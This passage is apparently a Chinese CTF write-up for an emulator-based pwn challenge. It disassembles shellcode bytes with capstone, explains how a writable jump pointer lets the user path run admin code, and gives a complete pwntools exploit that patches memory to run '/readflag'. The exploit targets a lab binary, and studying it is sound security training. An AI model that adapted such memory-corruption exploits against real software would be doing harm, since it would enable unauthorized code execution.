    0x1157: xor edi, edi
    0x1159: mov rdx, qword ptr [rsp + 0x10]
    0x115e: xor eax, eax
    0x1160: call 0x11fd
    0x1165: jmp 0x1022
    0x116a: mov esi, 0xff
    0x116f: mov edi, 0x3c
    0x1174: xor eax, eax
    0x1176: call 0x11fd
    0x117b: jmp 0x1022
exp_tail.py：
    from capstone import *
    TAIL = b'\x31\xc0\xb9\x32\x00\x00\x00\x48\x8d\x15\x55\x00\x00\x00\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x18\x66\x89\x44\x24\x0e\x31\xc0\xe8\x6d\x00\x00\x00\x31\xf6\x31\xff\x31\xc0\x48\x8d\x54\x24\x0e\xb9\x02\x00\x00\x00\xe8\x58\x00\x00\x00\x80\x7c\x24\x0e\x79\x75\x11\x48\x83\xc4\x18\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x10\x31\xf6\xbf\x3c\x00\x00\x00\x31\xc0\xe8\x32\x00\x00\x00\x43\x6f\x6e\x67\x72\x61\x74\x75\x6c\x61\x74\x69\x6f\x6e\x73\x21\x20\x54\x65\x73\x74\x20\x73\x75\x63\x63\x65\x65\x64\x21\x0a\x54\x72\x79\x20\x61\x67\x61\x69\x6e\x3f\x20\x28\x79\x2f\x5b\x6e\x5d\x29\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3'
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    for i in md.disasm(TAIL, 0x1000):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
**result：**
    0x1000: xor eax, eax
    0x1002: mov ecx, 0x32
    0x1007: lea rdx, [rip + 0x55]
    0x100e: mov esi, 1
    0x1013: mov edi, 1
    0x1018: sub rsp, 0x18
    0x101c: mov word ptr [rsp + 0xe], ax
    0x1021: xor eax, eax
    0x1023: call 0x1095
    0x1028: xor esi, esi
    0x102a: xor edi, edi
    0x102c: xor eax, eax
    0x102e: lea rdx, [rsp + 0xe]
    0x1033: mov ecx, 2
    0x1038: call 0x1095
    0x103d: cmp byte ptr [rsp + 0xe], 0x79
    0x1042: jne 0x1055
    0x1044: add rsp, 0x18
    0x1048: movabs rdi, 0xbabecafe000
    0x1052: jmp qword ptr [rdi + 0x10]
    0x1055: xor esi, esi
    0x1057: mov edi, 0x3c
    0x105c: xor eax, eax
    0x105e: call 0x1095
    0x1063: outsd dx, dword ptr [rsi]
    0x1065: outsb dx, byte ptr [rsi]
    0x1066: jb 0x10ca
    0x1069: je 0x10e0
    0x106b: insb byte ptr [rdi], dx
至此反汇编出来了，我们分析一下汇编代码吧，从而分析漏洞，真正的洞是在jmp跳转，从汇编来看，jmp的地址我们是有可写的操作的，如果我们找出精确位置把标识物该admin为标识物，然后再切换进而修改执行的内容是不是就能读取flag了，
我想了想是的，没错，那有一点的是我们该如何确定位置，第一个位置好确定，直接往stack读入我们的code就可以了，但想切换回来再修改其内容就比较难找了，其实仔细读读汇编也不是很难找，前面说了这个题的考点就是admin权限进行rce，那我们直接看反汇编出的admin：
    0x1000: mov ecx, 0x10
    0x1005: lea rdx, [rip + 0x37]
    0x100c: xor eax, eax
    0x100e: mov esi, 1
    0x1013: mov edi, 1
    0x1018: sub rsp, 8
    0x101c: call 0x1080 #看到有个call 去到0x1080这个地方了
    0x1021: lea rax, [rip + 0x2b] #把rip+0x2b赋值给了rax
    0x1028: movabs qword ptr [0xbabecafe233], rax #rax赋值到了stack：0xbabecafe233
    0x1032: add rsp, 8
    0x1036: movabs rdi, 0xbabecafe000
    0x1040: jmp qword ptr [rdi + 8] #rce了
    0x1043: insd dword ptr [rdi], dx
如上是我分析的一个关键点，那如果计算出0x101c汇编指令和0x1021汇编指令的偏移就能得出合适的位置，原先的code地址是0x1000而我们call的地址是0x1080,所以这里我们要减去0x1000计算出0x80,再下面一条指令是rip+0x2b,所以我们要用0x80-0x2b=0x55，那我们的code+0x1000+0x55就是精确的地址了，但是考虑到py脚本里有一行检测k33nlab的操作，所以为了不报错出现其它的意外，我们要在0x53这个地方填充一下k33nlab，后面再填充我们要执行的命令。
exp:
    from pwn import *
    p = process(["python3", "./uc_masteeer.py"])
    context.log_level = "debug"
    context.arch = "amd64"
    CODE = 0xdeadbeef000
    STACK = 0xbabecafe000
    def admin_test():
    p.recvuntil(b"?: ")
    p.sendline(b"1")
    def user_test():
    p.recvuntil(b"?: ")
    p.sendline(b"2")
    def patch_data(target, size, data):
    p.recvuntil(b"?: ")
    p.sendline(b"3")
    p.sendafter(b"addr: ", p64(target))
    p.sendafter(b"size: ", p64(size))
    p.sendafter(b"data: ", data)
    def exp():
    p.send(b"\x90")
    patch_data(STACK, 8, p64(CODE))
    admin_test()
    patch_data(STACK, 8, p64(CODE+0x1000))
    cmd = b"k33nlab"
    cmd += b"/readflag\x00"
    patch_data(CODE+0x1000+0x53, len(cmd), cmd)
    user_test()
    p.interactive()
    if __name__ == "__main__":
    exp()
总结：这道题质量还是蛮高的，能学到不少,希望再接再厉。。